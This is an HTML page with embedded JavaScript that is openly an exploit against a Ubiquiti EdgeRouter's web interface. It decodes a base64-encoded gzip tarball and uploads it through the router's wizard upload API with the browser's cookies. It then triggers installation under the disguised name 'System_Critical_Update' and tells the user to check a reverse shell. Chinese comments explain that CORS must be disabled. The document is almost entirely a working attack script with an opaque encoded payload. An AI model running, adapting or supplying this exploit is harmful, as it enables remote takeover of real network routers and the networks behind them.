<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="referrer" content="no-referrer"> <title>Router RCE</title>
</head>
<body>
    <h1>Ubiquiti EdgeRouter RCE (Smart Mode)</h1>
    <button onclick="runExploit()">⚡ Pwn Now ⚡</button>
    <div id="log" style="white-space: pre-wrap; font-family: monospace; color: green;"></div>

    <script>
        var target = "https://192.168.1.1";

        function log(msg) {
            document.getElementById("log").innerText += "\n" + msg;
            console.log(msg);
        }

        function runExploit() {
            // 1. 准备 Payload
            var b64Data = "H4sICCx1MmkC/2V4cGxvaXQudGFyAO3VQU/CMBjG8Z75FDWeXft23ZolaDyIgYNICIlHUrclm7LNjIJE43eX6UGjAU/MAM/v0qVb0kvf/T3hicuRXfVTm6Q12wn5adMqpa++npt9kook4yvWgsXc2Xp9PDtOKuSFy4v0nEyoI9LahF7kBxR1GByB5/zF1slZvSh3d0Yz1KHWzUomkN/XD0SaUUDN5VM6CNbzr8gnxmWb8x/bWbXt//fX+z11eiLu81LMs46rFnHGhSuexOhu2LuaXo9vb6aD4aQ3HvYmnTgrqoQbYzZ/gmnaPx76j/6j/0fefy9zxezf+i/9X/1Xxkf/29DN6KJv48c04cvc8kHp0rpMXVes9zEd6D/6j/7D4VraWZ5YV9Xew7wqdzf/W/sv1c/+m1Ci/214fcMMAAAAAAAAAAAcsncEDx/KACgAAA==";
            var byteCharacters = atob(b64Data);
            var byteNumbers = new Array(byteCharacters.length);
            for (var i = 0; i < byteCharacters.length; i++) {
                byteNumbers[i] = byteCharacters.charCodeAt(i);
            }
            var blob = new Blob([new Uint8Array(byteNumbers)], { type: "application/x-gzip" });

            // 2. 发送 Step 1 (上传)
            var formData = new FormData();
            formData.append("qqfile", blob, "exploit.tar.gz"); // 文件名不重要了，反正它会改名

            var xhr = new XMLHttpRequest();
            xhr.open("POST", target + "/api/wizard/upload.json", true);
            xhr.withCredentials = true; // 必带 Cookie

            log("[*] Step 1: Uploading payload...");

            xhr.onload = function () {
                if (xhr.status === 200) {
                    try {
                        // 关键点：因为关闭了 CORS，我们现在可以看到这个 JSON 了！
                        var resp = JSON.parse(xhr.responseText);
                        log("[+] Upload Success! Server response: " + xhr.responseText);
                        
                        if (resp.path) {
                            log("[!] Got random path: " + resp.path);
                            // 拿到真实路径，发起第二步
                            triggerInstall(resp.path);
                        } else {
                            log("[-] JSON parsed but no 'path' found. Response: " + xhr.responseText);
                        }
                    } catch (e) {
                        log("[-] Could not parse JSON. Is Chrome flag active? Error: " + e);
                    }
                } else {
                    log("[-] Upload failed. Status: " + xhr.status);
                }
            };
            xhr.send(formData);
        }

        function triggerInstall(realPath) {
            log("[*] Step 2: Executing payload at " + realPath + " ...");
            
            var xhr2 = new XMLHttpRequest();
            xhr2.open("POST", target + "/api/wizard/create.json", true);
            xhr2.withCredentials = true;

            var formData2 = new FormData();
            formData2.append("name", "System_Critical_Update");
            formData2.append("path", realPath); // 使用从 Step 1 拿到的真实路径

            xhr2.onload = function () {
                log("[+] Exploit chain sent! Check your reverse shell.");
            };
            xhr2.send(formData2);
        }
    </script>
</body>
</html>
